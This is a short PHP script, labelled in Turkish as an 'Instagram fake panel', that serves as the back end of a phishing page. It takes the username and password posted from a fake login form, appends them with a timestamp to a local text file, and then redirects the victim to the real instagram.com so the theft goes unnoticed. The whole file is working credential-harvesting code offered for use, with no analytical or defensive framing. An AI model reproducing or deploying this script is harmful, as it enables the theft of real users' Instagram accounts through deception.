<?php

if (isset($_POST['username']) && isset($_POST['password'])) {

$save = fopen("saved_info.txt","a+");
$username = $_POST['username'];
$password = $_POST['password'];
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$vericekilen = ("
+-+-+ İNSTAGRAM FAKE PANEL +-+-+

 Tarih         : ".$tarih."

 Kullanıcı Adı : ".$username."

 Şifre         : ".$password."

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
fwrite($save,$vericekilen);
fclose($save);
header('Location: https://instagram.com');
}
?>
